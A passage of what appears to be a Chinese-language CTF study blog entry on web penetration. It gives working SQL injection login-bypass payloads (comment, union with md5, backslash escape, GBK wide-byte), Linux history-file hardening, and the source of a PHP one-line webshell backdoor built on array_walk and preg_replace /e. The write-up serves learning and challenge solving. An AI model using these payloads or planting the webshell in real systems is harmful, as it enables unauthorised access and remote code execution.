if($query[user]=="admin") &#123; echo "&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"; &#125; if($query[user] != "admin") &#123; echo("&lt;p&gt;You are not admin!&lt;/p&gt;"); &#125;&#125;echo $query[user]; 分析：会对传入参数两端去空格，然后sql拼接如下 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;; 所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。 MySQL主要有三种注释方式： 注释方式 说明 # 注释到行尾 /*内容*/ 用于行间或多行注释（也可用/**/代替空格） – 也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等（’ or 1=1– ） 解法：本题可post：user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123 sql语句就变成select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;) 查询语句就能成功返回user列，值为admin的那条记录。 union查询源码： 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'")); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo "&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"; &#125; else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125;&#125;?&gt; 解法：关键点在源代码第7、8行。首先要观察，我们能够控制的查询结果有$query[pw]的值，通过让union前的查询语句为空，查询结果由union后面的语句控制即可。 例如：select pw from ctf where user=&#39;-1&#39; union select &#39;mytest&#39;这样查询结果pw就是’mytest’这个字符串了。再看那个if语句，只看后面的判断，实际上只要输入的和查询的结果一致就行了。 注意别忘记输入pass后，会对其进行MD5加密。所以构造post：user=&#39; union select md5(&#39;suqir&#39;)#&amp;pass=suqir查询语句就变为SELECT * FROM users WHERE name=&#39;admin&#39; AND pass=&#39;pass&#39;; 转义源码： 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag;--&gt; 分析：这题的clean函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了，即构造username=suqir\&amp;password=or%201%23使得查询语句如下 SELECT * FROM users WHERE name=&#39;suqir\&#39;&#39; AND pass=&#39;or%201%23&#39; 即 123456SELECT * FROM users WHERE name='suqir\' AND pass=' 『 [name]的值为 [' AND pass=] ，显然逻辑值为false 』or 1 『 但没关系，[false or 1] 的逻辑值为真』 #' 『 注释掉多余的单引号 』即select * from users where false or 1 一道综合题:南邮CTF-综合题2及其writeup GBK宽字节编码漏洞(gbk_sql_injection)介绍：php中MYSQL数据库,如果是GBK编码.一定要小心GBK宽字节编码漏洞正常情况下 magic_quote_gpc 为ON,如果输入 http://www.xxxx.com/index.php?user=11′ and 1=2 # SQL语句就会变成 SELECT * FROM user WHERE user=’1\’ and 1=2 #’ 自动加上了\转义，如果构造特殊的宽字节编码呢？ http://www.xxxx.com/index.php?user=11%df%27 and 1=2 # SQL语句就变成 SELECT * FROM user WHERE user=’11運’ and 1=2#’ 这样就注入上了！ 11%df会被解析成11運,而%27被邪恶的解析成&#39;就绕过了gpc转义,就成功构造注入了 Unix/Linux相关bash_historyBash shell在~/.bash_history（~/表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个.bash_history文件。 为了安全，bash shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。 删除方法: 第一步：/etc/profile文件中的HISTFILESIZE和HISTSIZE行确定所有用户的.bash_history文件中可以保存的旧命令条数。强烈建议把把/etc/profile文件中的HISTFILESIZE和HISTSIZE行的值设为一个较小的数，比如30。编辑profile文件vi /etc/profile，把下面这行改为： 12HISTFILESIZE=30HISTSIZE=30 这表示每个用户的.bash_history文件只可以保存30条旧命令。 第二步：网管还应该在/etc/skel/.bash_logout文件中添加下面这行rm -f $HOME/.bash_history。这样，当用户每次注销时.bash_history文件都会被删除. vi编辑器的备份文件linux下一般使用vi编辑器，并且异常退出会留下备份文件xxx.swp 一句话木马数组回调后门源码： 12345&lt;?php$e = $_REQUEST['www'];$arr = array($_POST['wtf'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt; 分析：利用了php中回调函数的后门，可以使www为preg_replace函数，当array_walk()将函数作用于数组时，POST传入的数据作为preg_replace()的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。 测试： 未完待续。。。]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
</search>
